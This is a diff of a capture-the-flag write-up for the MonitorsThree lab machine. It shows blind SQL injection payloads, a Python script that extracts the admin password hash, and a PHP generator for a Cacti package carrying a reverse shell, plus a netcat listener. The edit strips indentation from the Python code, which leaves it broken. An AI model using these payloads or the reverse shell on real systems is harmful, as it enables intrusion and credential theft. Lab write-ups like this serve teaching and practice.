@@ -48,50 +48,73 @@ there is a login page in monitorsthree.htb/login.php, and when using forgot pass
 
 ### Part 2: Foothold
 
-by submitting : `'order by 3--+` till it gives error, from error we can see that it uses mariadb
-or we can use:
-`ad'union select null,null,null,null,null,null,null,null,null from dual-- `
+by submitting : `'order by 3--+`
+till it gives error, from error we can see that it uses mariadb or we can use:
+
+<span style="color: red;">
+ad'union select null,null,null,null,null,null,null,null,null from dual--
+</span>
+
 when we query nine column it says successfully sent request code, so we should use nine column from now in our sql query.
-by submitting `'||(SELECT '' FROM table)||'` it gives error and querying using
-`'||(SELECT '' FROM users)||'` gives successful output
+by submitting
+
+<span style="color: red;">ad'||(SELECT '' FROM table)||'</span>
+
+it gives error and querying using
+
+<span style="color: red;">ad'||(SELECT '' FROM users)||'</span>
+
+gives successful output
 
 ![NMAP](/static/writeups/monitors/5.png)
 
 now we know there is a table called users.
 To enumerate user, i first used username administrator
-`ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'`
-this gives error: `Unable to process request, try again!`
+
+<span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'</span>
+
+this gives error: 'Unable to process request, try again!'
 
 ![NMAP](/static/writeups/monitors/4.png)
 
-but as when we input admin: `ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'`
-it outputs: `Successfully sent password reset request!`
+but as when we input admin:
+
+<span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'</span>
+
+it outputs: 'Successfully sent password reset request!'
 
 ![NMAP](/static/writeups/monitors/5.png)
 
-so, we know there is user called admin more clinically now.
+so, we know there is user called admin now.
 
-`ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'`
-password length = 32
-`ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'`
+<span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'</span>
 
-`ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'`
+it returns successful so, password length must be 32, it means it is some kind of hash
 
-It is time consuming so i decided to do it with python script:
+<span style="color: red;">
+ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'
+</span></br>
+<span style="color: red;">
+ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'
+</span>
+
+As it returns successful message back like this, we found first and second character of hash but it is time consuming so i decided to do it with python script:
 
 ```
+
 import requests
 import time
 
 # Target URL
+
 url = "http://monitorsthree.htb/forgot_password.php"
 
 characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 # Function to check if a guessed character is correct
-def is_correct_char(position, char):
-    # Construct payload
-    payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"
+
+def is_correct_char(position, char): # Construct payload
+payload = f"ad' ||((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}')||'"
 
     # Data to be sent in the POST request
     data = {
@@ -112,17 +135,17 @@ def is_correct_char(position, char):
     return False
 
 # Loop to find each character of the password
-for position in range(1, 33):  # Assuming password length is 32
-    for char in characters:
-        if is_correct_char(position, char):
-            # Add the correct character to the known password
-            known_password += char
-            print(f"[+] Found character {position}: {char}")
-            break
-    # Delay to avoid server-side rate limiting or detection
-    time.sleep(1)  # Adjust the delay as necessary
+
+for position in range(1, 33): # Assuming password length is 32
+for char in characters:
+if is_correct_char(position, char): # Add the correct character to the known password
+known_password += char
+print(f"[+] Found character {position}: {char}")
+break # Delay to avoid server-side rate limiting or detection
+time.sleep(1) # Adjust the delay as necessary
 
 # Print the complete password when done
+
 print(f"[+] Password: {known_password}")
 
 ```
@@ -148,6 +171,7 @@ Now, lets use these credential in login.php and 'cacti.monitorsthree.htb'. One t
 To get shell i used this:
 
 ```
+
 <?php
 
 $xmldata = "<xml>
@@ -167,6 +191,7 @@ $filedata = "<?php
 \$sock = fsockopen(\$ip, \$port);
 \$proc = proc_open('/bin/bash -i', array(0 => \$sock, 1 => \$sock, 2 => \$sock), \$pipes);
 ?>";
+
 $keypair = openssl_pkey_new();
 $public_key = openssl_pkey_get_details($keypair)["key"];
 openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
@@ -176,7 +201,6 @@ file_put_contents("shell.xml", str_replace("<signature></signature>", "<signatur
 system("cat shell.xml | gzip -9 > shell.xml.gz; rm shell.xml");
 
 ?>
-
 
 ```
 
@@ -189,3 +213,7 @@ before that open netcat listener in your machine: `nc -nvlp port`
 I got shell as www-data using this method.
 
 ### Part 3: Privilege Escalation:
+
+```
+
+```
